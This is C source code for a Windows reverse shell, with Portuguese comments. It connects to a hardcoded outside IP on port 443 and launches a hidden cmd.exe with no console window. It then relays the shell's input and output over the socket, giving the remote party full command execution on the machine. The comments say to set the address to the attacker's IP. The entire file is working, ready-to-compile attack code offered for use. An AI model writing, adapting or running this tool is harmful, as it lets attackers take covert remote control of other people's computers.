#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#pragma comment(lib, "ws2_32.lib")

#define CLIENT_IP "45.190.52.123"    // ALTERAR PARA IP DO ATACANTE
#define CLIENT_PORT 443         // ALTERAR PARA PORTA DO ATACANTE
#define BUFFER_SIZE 4096

// Estrutura para passar dados entre threads
typedef struct {
    SOCKET sock;
    HANDLE hRead;
    HANDLE hWrite;
} PIPE_DATA;

// Thread para ler do socket e escrever no pipe (entrada do cmd)
DWORD WINAPI SocketToPipeThread(LPVOID lpParam) {
    PIPE_DATA* data = (PIPE_DATA*)lpParam;
    char buffer[BUFFER_SIZE];
    int bytesRead;
    DWORD bytesWritten;
    
    while (1) {
        bytesRead = recv(data->sock, buffer, BUFFER_SIZE, 0);
        if (bytesRead <= 0) break;
        
        WriteFile(data->hWrite, buffer, bytesRead, &bytesWritten, NULL);
    }
    
    return 0;
}

// Thread para ler do pipe (saída do cmd) e escrever no socket
DWORD WINAPI PipeToSocketThread(LPVOID lpParam) {
    PIPE_DATA* data = (PIPE_DATA*)lpParam;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead;
    int bytesSent;
    
    while (1) {
        if (!ReadFile(data->hRead, buffer, BUFFER_SIZE, &bytesRead, NULL) || bytesRead == 0)
            break;
        
        bytesSent = send(data->sock, buffer, bytesRead, 0);
        if (bytesSent <= 0) break;
    }
    
    return 0;
}

int main(void) {
    WSADATA wsaData;
    SOCKET sockt = INVALID_SOCKET;
    HANDLE hStdinRead = NULL, hStdinWrite = NULL;
    HANDLE hStdoutRead = NULL, hStdoutWrite = NULL;
    HANDLE hThreadIn = NULL, hThreadOut = NULL;
    
    // 1. Inicializar Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "[ERROR] WSAStartup failed\n");
        return 1;
    }
    
    // 2. Criar socket e conectar
    sockt = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockt == INVALID_SOCKET) {
        fprintf(stderr, "[ERROR] Socket failed\n");
        WSACleanup();
        return 1;
    }
    
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(CLIENT_PORT);
    sa.sin_addr.s_addr = inet_addr(CLIENT_IP);
    
    if (connect(sockt, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        fprintf(stderr, "[ERROR] Connect failed\n");
        closesocket(sockt);
        WSACleanup();
        return 1;
    }
    
    fprintf(stderr, "[INFO] Connected to %s:%d\n", CLIENT_IP, CLIENT_PORT);
    
    // 3. Criar pipes para comunicação com cmd.exe
    SECURITY_ATTRIBUTES saAttr;
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;
    
    // Pipe para stdin do cmd (nós escrevemos, cmd lê)
    if (!CreatePipe(&hStdinRead, &hStdinWrite, &saAttr, 0)) {
        fprintf(stderr, "[ERROR] Stdin pipe failed\n");
        goto cleanup;
    }
    SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0); 
    
    // Pipe para stdout/err do cmd (cmd escreve, nós lemos)
    if (!CreatePipe(&hStdoutRead, &hStdoutWrite, &saAttr, 0)) {
        fprintf(stderr, "[ERROR] Stdout pipe failed\n");
        goto cleanup;
    }
    SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0); 
    
    // 4. Configurar STARTUPINFO para redirecionamento
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = hStdinRead;    // cmd lê daqui
    si.hStdOutput = hStdoutWrite; // cmd escreve aqui
    si.hStdError = hStdoutWrite;  // stderr também vai para o mesmo pipe
    
    ZeroMemory(&pi, sizeof(pi));
	
    // 5. Criar processo cmd.exe
    char cmdLine[] = "cmd.exe";
    if (!CreateProcessA(
        NULL,           
        cmdLine,
        NULL,           
        NULL,           
        TRUE,           
        CREATE_NO_WINDOW, 
        NULL,          
        NULL,           
        &si,
        &pi)) 
    {
        fprintf(stderr, "[ERROR] CreateProcess failed (%lu)\n", GetLastError());
        goto cleanup;
    }
    
    fprintf(stderr, "[INFO] Cmd.exe started (PID: %lu)\n", pi.dwProcessId);
    
    // 6. Fechar handles que o cmd.exe herdou (para evitar vazamentos)
    CloseHandle(hStdinRead);
    CloseHandle(hStdoutWrite);
    
    // 7. Criar threads para redirecionamento socket ↔ pipe
    PIPE_DATA stdinData = { sockt, NULL, hStdinWrite };
    PIPE_DATA stdoutData = { sockt, hStdoutRead, NULL };
    
    hThreadIn = CreateThread(NULL, 0, SocketToPipeThread, &stdinData, 0, NULL);
    hThreadOut = CreateThread(NULL, 0, PipeToSocketThread, &stdoutData, 0, NULL);
    
    if (!hThreadIn || !hThreadOut) {
        fprintf(stderr, "[ERROR] Thread creation failed\n");
        goto cleanup;
    }
    
    
    // 8. Aguardar processo ou threads terminarem
    WaitForSingleObject(pi.hProcess, INFINITE);
    
cleanup:
    // 9. Limpeza
    if (hThreadIn) {
        TerminateThread(hThreadIn, 0);
        CloseHandle(hThreadIn);
    }
    if (hThreadOut) {
        TerminateThread(hThreadOut, 0);
        CloseHandle(hThreadOut);
    }
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    if (hStdinRead) CloseHandle(hStdinRead);
    if (hStdinWrite) CloseHandle(hStdinWrite);
    if (hStdoutRead) CloseHandle(hStdoutRead);
    if (hStdoutWrite) CloseHandle(hStdoutWrite);
    if (sockt != INVALID_SOCKET) closesocket(sockt);
    
    WSACleanup();
    return 0;
}
